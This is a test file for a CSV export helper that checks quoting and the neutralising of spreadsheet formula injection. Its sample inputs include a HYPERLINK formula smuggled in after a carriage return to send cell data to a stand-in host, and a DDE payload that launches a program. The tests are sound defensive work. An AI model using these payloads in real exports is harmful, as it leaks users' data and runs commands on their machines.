// node --test apps/studio/src/lib/csv.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { csvCell, csvLine } from "./csv.ts";

/**
 * A strict reader of what the exports write: rows end on LF, CR or CRLF
 * outside quotes, as the spreadsheets that end a row on a bare CR do.
 */
function parse(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") {
      row.push(cell);
      cell = "";
    } else if (c === "\r" || c === "\n") {
      if (c === "\r" && text[i + 1] === "\n") i++;
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
    } else cell += c;
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

test("plain values pass through", () => {
  assert.equal(csvCell("Shomin bronze"), "Shomin bronze");
  assert.equal(csvCell("2026-0001"), "2026-0001");
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined), "");
  assert.equal(csvCell(""), "");
});

test("quotes, commas and line breaks are quoted", () => {
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
  assert.equal(csvCell("Kyoto, Japan"), '"Kyoto, Japan"');
  assert.equal(csvCell("line one\nline two"), '"line one\nline two"');
});

test("a carriage return in the middle of a value is quoted", () => {
  // The bypass: unquoted, a reader ending rows on CR started a new row here
  // whose first cell was an unguarded formula.
  const value = '12 High St\r=HYPERLINK("https://x.test/?"&A1,"x")';
  const out = csvCell(value);
  assert.ok(out.startsWith('"') && out.endsWith('"'), out);
  assert.ok(!out.includes("\r"), "CR is written as LF");
  const rows = parse(`${csvLine(["a", value, "c"])}\nnext`);
  assert.equal(rows.length, 2);
  assert.deepEqual(rows[0], ["a", '12 High St\n=HYPERLINK("https://x.test/?"&A1,"x")', "c"]);
});

test("CRLF and bare CR both become LF inside the quotes", () => {
  assert.equal(csvCell("a\r\nb"), '"a\nb"');
  assert.equal(csvCell("a\rb"), '"a\nb"');
});

test("text that starts like a formula is neutralised", () => {
  for (const s of ["=1+1", "+44 20 7946 0000", "-2", "@SUM(A1)", "\t=1", "\r=1", "\n=1", "=cmd|' /C calc'!A0"]) {
    const out = csvCell(s);
    const cell = parse(out)[0]?.[0] ?? "";
    assert.ok(cell.startsWith("'"), `${JSON.stringify(s)} -> ${JSON.stringify(out)}`);
  }
  assert.equal(csvCell("=1+1"), "'=1+1");
  assert.equal(csvCell('=HYPERLINK("x")'), `"'=HYPERLINK(""x"")"`);
});

test("numbers stay numbers, negatives included", () => {
  assert.equal(csvCell(-150), "-150");
  assert.equal(csvCell(1234.5), "1234.5");
  assert.equal(csvCell(0), "0");
  assert.equal(csvCell(true), "true");
  // Not finite is not a figure: treated as text.
  assert.equal(csvCell(-Infinity), "'-Infinity");
});

test("every cell of a crafted row stays in its row and column", () => {
  const evil = ["Ann", "Lee\r=1+1", 'x",=2+2', "\r\n@3", -5];
  const text = [csvLine(["first", "last", "addr", "phone", "n"]), csvLine(evil)].join("\n");
  const rows = parse(text);
  assert.equal(rows.length, 2);
  const row = rows[1] ?? [];
  assert.equal(row.length, 5);
  for (const cell of row) {
    // A cell may hold a line break, but no cell begins as a formula.
    assert.ok(!/^[=+\-@]/.test(cell) || cell === "-5", JSON.stringify(cell));
  }
  assert.deepEqual(row, ["Ann", "Lee\n=1+1", 'x",=2+2', "'\n@3", "-5"]);
});
